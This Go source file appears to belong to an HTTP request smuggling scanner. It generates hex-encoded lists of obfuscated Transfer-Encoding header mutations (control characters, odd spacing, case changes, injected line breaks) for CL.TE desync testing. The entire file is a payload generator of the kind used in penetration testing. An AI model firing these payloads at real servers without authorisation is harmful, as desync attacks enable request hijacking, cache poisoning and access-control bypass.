package smuggler

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"os"
)

func WriteBasic() {
	f, err := os.OpenFile("./tests/clte/basic", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		panic(err)
	}
	defer f.Close()

	f.WriteString(hex.EncodeToString([]byte(" Transfer-Encoding: chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding:\tchunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding\t:\tchunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte(" Transfer-Encoding : chunked")))
	f.Write([]byte{'\n'})

	for i := range []byte{0x1, 0x4, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0x1F, 0x20, 0x7f, 0xA0, 0xFF} {
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding:%cchunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding%c: chunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("%cTransfer-Encoding: chunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding: chunked%c", i))))
		f.Write([]byte{'\n'})

		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("X: X%cTransfer-Encoding: chunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding: chunked%cX: X", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("X: X\r%cTransfer-Encoding: chunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("X: X%c\nTransfer-Encoding: chunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding: chunked\r%cX", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding: chunked%cX: X", i))))
		f.Write([]byte{'\n'})
	}
}

func WriteDouble() {
	f, err := os.OpenFile("./tests/clte/double", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		panic(err)
	}
	defer f.Close()

	for i := 0x1; i < 0x21; i++ {
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("%cTransfer-Encoding%c:chunked", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("%cTransfer-Encoding:%cchunked", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("%cTransfer-Encoding: chunked%c", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding%c:%cchunked", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding%c: chunked%c", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding:%cchunked%c", i, i))))
		f.Write([]byte{'\n'})
	}

	for i := 0x7F; i < 0x100; i++ {
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("%cTransfer-Encoding%c:chunked", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("%cTransfer-Encoding:%cchunked", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("%cTransfer-Encoding: chunked%c", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding%c:%cchunked", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding%c: chunked%c", i, i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding:%cchunked%c", i, i))))
		f.Write([]byte{'\n'})
	}
}

func WriteExhaustive() {
	f, err := os.OpenFile("./tests/clte/exhaustive", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		panic(err)
	}
	defer f.Close()

	f.WriteString(hex.EncodeToString([]byte(" Transfer-Encoding: chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding:\tchunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding\t:\tchunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer Encoding: chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer_Encoding: chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer Encoding:chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding : chunked")))
	f.Write([]byte{'\n'})

	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding:  chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding:\u000Bchunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: chunked, cow")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: cow, chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Content-Encoding: chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding:\n chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: \"chunked\"")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: 'chunked'")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: chunk")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("TrAnSFer-EnCODinG: cHuNkeD")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("TRANSFER-ENCODING: CHUNKED")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: chunked\r")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: chunked\t")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer\r-Encoding: chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: cow chunked bar")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding:\xFFchunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transfer-Encoding: ch\x96nked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("Transf\x82r-Encoding: chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("X:X\rTransfer-Encoding: chunked")))
	f.Write([]byte{'\n'})
	f.WriteString(hex.EncodeToString([]byte("X:X\nTransfer-Encoding: chunked")))
	f.Write([]byte{'\n'})

	for i := 0x1; i < 0x20; i++ {
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding:%cchunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding%c: chunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("%cTransfer-Encoding: chunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding: chunked%c", i))))
		f.Write([]byte{'\n'})
	}

	for i := 0x7F; i < 0x100; i++ {
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding:%cchunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding%c: chunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("%cTransfer-Encoding: chunked", i))))
		f.Write([]byte{'\n'})
		f.WriteString(hex.EncodeToString([]byte(fmt.Sprintf("Transfer-Encoding: chunked%c", i))))
		f.Write([]byte{'\n'})
	}
}

func Reader(file string) {
	f, err := os.OpenFile(file, os.O_RDONLY, 0644)
	if err != nil {
		panic(err)
	}

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		res, err := hex.DecodeString(line)
		if err != nil {
			panic(err)
		}
		fmt.Println(string(res))
	}
}
